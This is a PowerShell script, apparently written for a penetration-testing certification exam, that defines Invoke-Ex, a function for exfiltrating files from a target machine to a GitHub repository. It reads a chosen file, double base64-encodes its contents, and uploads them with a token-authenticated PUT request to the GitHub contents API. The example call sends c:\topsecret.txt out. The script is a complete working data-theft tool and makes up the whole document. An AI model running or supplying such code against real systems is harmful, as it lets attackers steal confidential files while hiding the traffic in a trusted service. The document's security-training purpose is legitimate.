
function Invoke-Ex
{
<#

.SYNOPSIS
exfiltrate files from target to github repo 

.DESCRIPTION

using Github for exfiltration of files.
     
.EXAMPLE

PS C:\>. .\Invoke-Ex
PS C:\>Invoke-Ex -token ??????? -URL https://api.github.com/repos/AZeroSec/testing/contents/example.txt -file c:\topsecret.txt


.LINK
https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line
https://developer.github.com/v3/repos/contents/#create-or-update-a-file



.NOTES

Student ID : NONE
This blog post has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam: http://www.securitytube-training.com/onlinecourses/powershell-for-pentesters/


#> 






    [CmdletBinding()] Param( 

    [Parameter(Mandatory = $true)]
    [String]
    $token ,
    [Parameter(Mandatory = $true)]
    [String]
    $URL,
    [Parameter(Mandatory = $true)]
    [String]
    $file ,
    [Parameter(Mandatory = $false)]
    [String]
    $Msg = "yay worked"


    )

        
    $exFile = Get-Content $file

    #base64 is Required from github docs for the content , you can encrypt the data then base64 encode it, in my case i encoded it twice
    $encode =[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($exFile))

    $double_encode = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($encode))
            
    # building the request fields 
    $auth = @{"Authorization"="token $token"}

    $data = @{"message"=$Msg; "content"=$double_encode}

    # converting body + message to json so we can create a new file in repo with it
    $jsonData = ConvertTo-Json $data

    # sending the request as PUT to create a new file to update you need sha in my case I just created a new file in repo with the base64 encoded content of file.
    $req = Invoke-WebRequest -Headers $auth -Method PUT -Body $JsonData -Uri $URL -UseBasicParsing

    if ($req.StatusCode -eq 201)
    {
        write-host "[+] File exfiltrated" -ForegroundColor Green
    }

    else
    {
        write-host "[-] Failed !!!" -ForegroundColor Red
    }


        
}
    